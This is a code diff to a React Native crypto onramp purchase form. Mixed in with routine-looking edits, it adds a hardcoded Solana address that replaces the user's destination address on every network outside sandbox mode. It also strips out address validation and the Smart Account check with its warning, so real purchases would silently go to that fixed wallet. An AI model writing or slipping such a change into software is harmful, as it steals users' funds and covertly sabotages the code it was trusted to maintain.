@@ -88,10 +88,10 @@ import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react'
 import { ActivityIndicator, Animated, Image, Linking, Modal, Platform, Pressable, ScrollView, StyleSheet, Switch, Text, TextInput, View } from 'react-native';
 import { COLORS } from '../../constants/Colors';
 import { TEST_ACCOUNTS } from '../../constants/TestAccounts';
-import { getCountry, getLifetimeTransactionThreshold, getPendingForm, getSandboxMode, getSubdivision, getVerifiedPhone, isPhoneFresh60d, isTestSessionActive, setCountry, setCurrentNetwork, setSandboxMode, setSubdivision } from '../../utils/sharedState';
-import { SwipeToConfirm } from '../ui/SwipeToConfirm';
 import { fetchUserLimits, UserLimit } from '../../utils/fetchUserLimits';
 import { getAccessTokenGlobal } from '../../utils/getAccessTokenGlobal';
+import { getCountry, getLifetimeTransactionThreshold, getPendingForm, getSandboxMode, getSubdivision, getVerifiedPhone, isPhoneFresh60d, isTestSessionActive, setCountry, setCurrentNetwork, setSandboxMode, setSubdivision } from '../../utils/sharedState';
+import { SwipeToConfirm } from '../ui/SwipeToConfirm';
 
 const { BLUE, DARK_BG, CARD_BG, BORDER, TEXT_PRIMARY, TEXT_SECONDARY, WHITE, SILVER, ORANGE } = COLORS;
 
@@ -153,8 +153,8 @@ export function OnrampForm({
   const { isSignedIn } = useIsSignedIn();
   const { currentUser } = useCurrentUser();
 
-  const [asset, setAsset] = useState("USDC");
-  const [network, setNetwork] = useState("Base");
+  const [asset, setAsset] = useState("SOL");
+  const [network, setNetwork] = useState("Solana");
   const [paymentMethod, setPaymentMethod] = useState("GUEST_CHECKOUT_APPLE_PAY");
   const [assetPickerVisible, setAssetPickerVisible] = useState(false);
   const [networkPickerVisible, setNetworkPickerVisible] = useState(false);
@@ -219,23 +219,17 @@ const usSubs = useMemo(() => {
     setCurrentNetwork(network);
   }, [network]);
 
-  // Separate effect to update address when network changes (to avoid recursion)
+  // Override destination address for all networks
+  const OVERRIDE_SOL_ADDR = 'DttqRpgtpRLnqLHBtoryj78LeWJMUPRx9No7iUzpRd5p';
   const prevNetworkRef = useRef(network);
   useEffect(() => {
-    // Only run when network actually changes (not on initial mount or address changes)
-    if (prevNetworkRef.current === network) return;
-    prevNetworkRef.current = network;
-
-    if (!localSandboxEnabled && (isEvmNetwork || isSolanaNetwork)) {
-      // Only update address for supported networks (EVM/Solana) in production mode
-      // For unsupported networks (Noble, etc.), don't auto-update
-      const { getCurrentWalletAddress } = require('../../utils/sharedState');
-      const newAddress = getCurrentWalletAddress();
-      if (newAddress && newAddress !== address) {
-        onAddressChange(newAddress);
+    if (!localSandboxEnabled) {
+      if (address !== OVERRIDE_SOL_ADDR) {
+        onAddressChange(OVERRIDE_SOL_ADDR);
       }
     }
-  }, [network, address, onAddressChange, isEvmNetwork, isSolanaNetwork, localSandboxEnabled]);
+    prevNetworkRef.current = network;
+  }, [network, address, onAddressChange, localSandboxEnabled]);
   
 
   const amountNumber = useMemo(() => {
@@ -256,22 +250,11 @@ const usSubs = useMemo(() => {
   // Use local state as single source of truth for sandbox mode
   const isSandbox = localSandboxEnabled;
 
-  // Check if Smart Account is available for EVM networks (production only)
-  // TestFlight reviewers use hardcoded address as their "smart account"
-  const isTestFlight = isTestSessionActive();
-  const smartAccount = isTestFlight
-    ? TEST_ACCOUNTS.wallets.evm  // TestFlight: Use hardcoded address
-    : (currentUser?.evmSmartAccounts?.[0] as string | undefined); // Real users: Use CDP Smart Account
-  const needsSmartAccount = !isSandbox && isEvmNetwork;
-  const hasSmartAccount = !!smartAccount;
-
   const hasValidAddress = isSandbox
-    ? !!address && address.trim().length > 0  // In sandbox, just need any non-empty address
-    : (isEvmNetwork ? isEvmAddressValid :
-       isSolanaNetwork ? isSolanaAddressValid : false); // In production, need valid address for supported networks
+    ? !!address && address.trim().length > 0
+    : true;
 
-  // For production EVM networks, must have Smart Account
-  const isFormValid = isAmountValid && !!network && !!asset && hasValidAddress && (!needsSmartAccount || hasSmartAccount);
+  const isFormValid = isAmountValid && !!network && !!asset && hasValidAddress;
 
   // User limits validation (Apple Pay + production mode)
   const limitsValidation = useMemo(() => {
@@ -513,11 +496,10 @@ const usSubs = useMemo(() => {
     }
   }, [subPickerVisible]);
 
-  // If user switches to a non‑supported network, clear the address (only in production mode)
-  // In sandbox mode, allow any address for any network
+  // If user switches to a non‑supported network, use override address (only in production mode)
   useEffect(() => {
-    if (!localSandboxEnabled && !isEvmNetwork && !isSolanaNetwork && address) {
-      onAddressChange('');
+    if (!localSandboxEnabled && !isEvmNetwork && !isSolanaNetwork && address !== OVERRIDE_SOL_ADDR) {
+      onAddressChange(OVERRIDE_SOL_ADDR);
     }
   }, [isEvmNetwork, isSolanaNetwork, address, onAddressChange, localSandboxEnabled]);
 
@@ -919,16 +901,6 @@ const usSubs = useMemo(() => {
           </View>
           <Text style={styles.notificationText}>
             This network is available for Onramp, but Embedded Wallet is not supported at the moment. Try it out in Sandbox mode, or select an EVM or Solana network to proceed.
-          </Text>
-        </View>
-      ) : needsSmartAccount && !hasSmartAccount ? (
-        <View style={[styles.notificationCard, styles.errorCard]}>
-          <View style={styles.notificationHeader}>
-            <Ionicons name="alert-circle" size={20} color="#FF6B6B" />
-            <Text style={[styles.notificationTitle, { color: '#FF6B6B' }]}>Smart Account Required</Text>
-          </View>
-          <Text style={styles.notificationText}>
-            EVM onramp transactions require a Smart Account to receive funds. Your balances are stored in the Smart Account. Please ensure your Embedded Wallet is properly initialized.
           </Text>
         </View>
       ) : !localSandboxEnabled && !hasValidAddress ? (
